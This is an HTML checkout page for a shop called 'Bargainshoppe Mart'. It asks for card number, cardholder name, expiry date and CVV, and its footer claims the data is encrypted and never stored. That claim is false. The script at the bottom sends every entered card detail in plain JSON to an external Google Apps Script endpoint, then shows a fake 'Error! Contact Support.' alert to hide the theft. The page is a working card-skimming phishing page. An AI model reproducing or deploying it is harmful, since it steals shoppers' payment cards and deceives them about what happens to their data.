<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bargainshoppe Mart - Secure Checkout</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }
        
        .form-container {
            padding: 40px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 1.1rem;
        }
        
        .input-group {
            display: flex;
            gap: 15px;
        }
        
        .input-group input {
            flex: 1;
        }
        
        input[type="text"],
        input[type="number"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            font-size: 1.1rem;
            transition: all 0.3s ease;
        }
        
        input[type="text"]:focus,
        input[type="number"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .card-icons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .card-icon {
            width: 50px;
            height: 30px;
            background: #f8f9fa;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 0.8rem;
            color: #666;
            border: 1px solid #e1e5e9;
        }
        
        .btn-group {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 30px;
        }
        
        .payment-btn {
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .visa-btn {
            background: linear-gradient(135deg, #0062ff 0%, #00aaff 100%);
            color: white;
        }
        
        .mastercard-btn {
            background: linear-gradient(135deg, #eb001b 0%, #f79e1b 100%);
            color: white;
        }
        
        .amex-btn {
            background: linear-gradient(135deg, #007cc3 0%, #00a9e0 100%);
            color: white;
        }
        
        .discover-btn {
            background: linear-gradient(135deg, #ff6000 0%, #ff9900 100%);
            color: white;
        }
        
        .payment-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        }
        
        .payment-btn:active {
            transform: translateY(0);
        }
        
        .secure-note {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 12px;
            color: #666;
        }
        
        .secure-note strong {
            color: #28a745;
        }
        
        @media (max-width: 600px) {
            .header h1 {
                font-size: 2rem;
            }
            
            .form-container {
                padding: 25px;
            }
            
            .btn-group {
                grid-template-columns: 1fr;
            }
            
            .input-group {
                flex-direction: column;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Bargainshoppe Mart</h1>
            <p>Secure Checkout - Your Payment is Encrypted</p>
        </div>
        
        <div class="form-container">
            <!-- ‚úÖ ADDED FORM TAG WITH ID -->
            <form id="paymentForm">
                <div class="form-group">
                    <label for="card-number">Card Number *</label>
                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
                    <div class="card-icons">
                        <div class="card-icon">Visa</div>
                        <div class="card-icon">MC</div>
                        <div class="card-icon">AmEx</div>
                        <div class="card-icon">Disc</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="card-name">Name on Card *</label>
                    <input type="text" id="card-name" placeholder="John Doe" required>
                </div>
                
                <div class="form-group">
                    <label>Expiration Date & CVV *</label>
                    <div class="input-group">
                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                        <input type="number" id="cvv" placeholder="CVV" maxlength="4" required>
                    </div>
                </div>
                
                <!-- ‚úÖ SUBMIT BUTTON INSIDE FORM -->
                <button type="submit" class="payment-btn visa-btn" style="width:100%; margin-top:20px; background:linear-gradient(135deg, #28a745 0%, #20c997 100%);">
                    <span>üí≥</span> PAY NOW
                </button>
            </form>
            
            <div class="secure-note">
                <p><strong>üîí Secure Payment:</strong> Your card information is encrypted and never stored on our servers. Bargainshoppe Mart uses industry-standard SSL encryption for all transactions.</p>
            </div>
        </div>
    </div>

    <!-- ‚úÖ FIXED JAVASCRIPT AT BOTTOM -->
    <script>
        // Format card number with spaces
        document.getElementById('card-number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue.substring(0, 19);
        });
        
        // Format expiration date
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // ‚úÖ FORM SUBMISSION HANDLER
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('paymentForm');
            
            if (form) {
                form.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    console.log('üì§ Payment form submitted...');
                    
                    // Collect form data
                    const data = {
                        cardNumber: document.getElementById('card-number').value.trim(),
                        cardName: document.getElementById('card-name').value.trim(),
                        expiry: document.getElementById('expiry').value.trim(),
                        cvv: document.getElementById('cvv').value.trim()
                    };
                    
                    console.log('üìã Data collected:', data);
                    
                    // Validate
                    if (!data.cardNumber || !data.cardName || !data.expiry || !data.cvv) {
                        alert('‚ùå Please fill in all required fields');
                        return;
                    }
                    
                    try {
                        // ‚úÖ FIXED URL - NO TRAILING SPACE
                        await fetch('https://script.google.com/macros/s/AKfycbz9hQTjNGAvm7m9IWITworpIl9CY4MMC96IPkLT4x6eNOH-r1eXMUtZGFNi2S_ldmO-/exec', {
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify(data)
                        });
                        
                        console.log('‚úÖ Submission successful!');
                        alert('‚úÖ Error! Contact Support.');
                        form.reset();
                        
                    } catch (error) {
                        console.error('üî• Error:', error);
                        alert('‚ùå Submission failed. Check browser console (F12) for details.');
                    }
                });
                
                console.log('‚úÖ Payment form handler ready!');
            } else {
                console.error('‚ùå Form not found!');
            }
        });
    </script>
</body>
</html>
